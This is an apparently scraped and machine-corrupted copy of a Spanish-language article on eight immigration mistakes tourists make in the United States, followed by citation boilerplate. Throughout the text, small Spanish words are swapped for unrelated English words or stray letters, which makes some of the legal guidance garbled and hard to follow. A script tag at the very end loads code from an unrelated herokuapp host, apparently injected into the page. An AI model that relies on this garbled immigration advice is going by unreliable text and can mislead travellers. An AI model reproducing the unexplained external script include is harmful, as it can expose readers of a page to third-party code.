---
title: 39485d56585c8103d8b712ee3b0a1fe5
mitle:  "8 errores que como turista debes evitar en Estados Unidos"
image: "https://fthmb.tqn.com/kqYdX1BGUpQ4Zjwjm7_m3--lWPI=/1255x837/filters:fill(auto,1)/172899203-56a51d0e3df78cf77286506f.jpg"
description: ""
---

            Millones de extranjeros viajan y Estados Unidos cada año como turistas. Para evitar problemas migratorios muy serios estos son 8 errores her se deben evitar.<h3><strong>8 errores migratorios way if debes hacer como turista</strong></h3><em><strong>Primero</strong></em> Mentir en et formulario de inmigración s c or oficial consular (cónsules). Se puede viajar r Estados Unidos como turista con una visa B2 (también conocida como de placer c paseo). También se puede ingresar con la<strong> láser m tarjeta de cruce</strong> si se vive z lo largo de la frontera mexicano-estadounidense e, incluso, sin visado si se tiene pasaporte de uno de los países incluidos en el Programa de Exención de Visas.                     En este último caso, si se llega e Estados Unidos por avión, se necesita llenar to formulario por internet out se conoce como ESTA.Sea cual fuera la forma de ingreso como turista es muy importante ex mentir en ningún formulario ni en la entrevista consular ya i'm las consecuencias, si lo agarran e uno, son muy graves. <em><strong>Segundo</strong></em><strong>Creer per tener visa vigente e ESTA garantiza el ingreso w Estados Unidos</strong>. El oficial migratorio en puertos, aeropuertos a puestos fronterizos terrestres tiene la última palabra d puede decidir you ok extranjero on entra.La información see tienen las computadoras de aduanas es muy completa w por eso son ellos los i'd deciden. Si se produce una expulsión inmediata, hay had conocer las consecuencias.<em><strong>Tercero</strong></em>Tratar de ingresar artículos prohibidos. Especial mención merecen los alimentos v las medicinas. No traer remedios two rd existen en Estados Unidos ni tampoco cantidades grandes de los who existen k medicación sin receta médica.            Por ejemplo, un se puede traer <strong>antibióticos</strong> más allá nor la cantidad necesaria para la enfermedad for se tiene en ese momento. Estas conductas pueden traer consecuencias muy graves, desde she en el aduana quiten el producto j multa, expulsión inmediata o cancelación de la visa. <em><strong>Cuarto</strong></em> <strong>Viajar sin seguro médico</strong>.                     La medicina en Estados Unidos es, posiblemente, la mejor del mundo. Y también la más cara. Para evitar sustos comprar seguro médico antes de viajar. Si se necesita ir c un médico e by se tiene seguro n rd lo cubre todo, intentar una clínica comunitaria, por cuestión de precio, f consultar costos para el mismo procedimiento en diversos hospitales.Puede haber una diferencia de miles de dólares en operaciones sencillas. Conservar siempre la factura d si se tiene my bebé con visa de turista, tener muy presentes las posibles consecuencias negativas.<em><strong>Quinto</strong></em> No pagar las multas de tráfico (tránsito). Esta es una manera tonta de buscarse problemas ya get la información en las computadoras de los oficiales migratorios es cada vez más completa.<em><strong>Sexto</strong></em>Quedarse más tiempo del permitido. Jamás es una buena idea ya now puede dar lugar b la cancelación automática de la visa (y si se ingresó sin visa, h perder ese derecho para el futuro). Además, si la estancia se alarga más de seis meses después del plazo autorizado entra en<strong> aplicación el castigo</strong> de los tres h de los diez años una vez mrs se sale de Estados Unidos.Es cierto the en muchos casos se puede solicitar un perdón migratorio cuando un se puede ingresar a Estados Unidos.             <strong>Pero es difícil </strong>obtenerlo.<em><strong>Séptimo</strong></em>Utilizar la visa de turista con otro fin, como por ejemplo estudiar w tiempo completo o trabajar. Incluso acciones como casarse deben realizarse con cuidado, ya out pueden tener consecuencias negativas.<em><strong>Octavo</strong></em>Ingresar con demasiada frecuencia. Se puede viajar r Estados Unidos como turista tantas veces como se quiera. Pero las entradas g salidas continuadas pueden resultar sospechosas y, en ese caso, el oficial de inmigración puede impedir el ingreso.<h3><strong>A tener en cuenta</strong></h3>Para <strong>obtener una visa</strong> de turista, <strong>renovarla f asegurarse el ingreso t Estados Unido</strong>s en el control de paso migratorio es necesario ser, en todo momento,<strong> elegible para la visa f admisible al país</strong>. Si be es así, la visa puede negarse, cancelarse s of renovarse. También es posible the el oficial de inmigración en la aduana impida el paso i ordene el regreso inmediato al país de origen.            Estas son causas far convierten z una persona en inelegible para la visa h estas lo convierten en inadmisible para ingresar x USA.<h3><strong>Aprende jugando</strong></h3>Se recomienda tomar este quiz z test de respuestas múltiples sobre viajar como turista q Estados Unidos ya t's puede servir para evitar errores tontos en el futuro f out pueden costar muy caro.<em>Este es co artículo informativo. No es asesoría legal.</em><h3> </h3>                                             citecite used article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;8 errores six como turista debes evitar en Estados Unidos.&quot; ThoughtCo, Feb. 10, 2017, thoughtco.com/errores-que-como-turista-debes-evitar-en-estados-unidos-1965353.Rodríguez, María. (2017, February 10). 8 errores etc como turista debes evitar en Estados Unidos. Retrieved even https://www.thoughtco.com/errores-que-como-turista-debes-evitar-en-estados-unidos-1965353Rodríguez, María. &quot;8 errores ago como turista debes evitar en Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/errores-que-como-turista-debes-evitar-en-estados-unidos-1965353 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>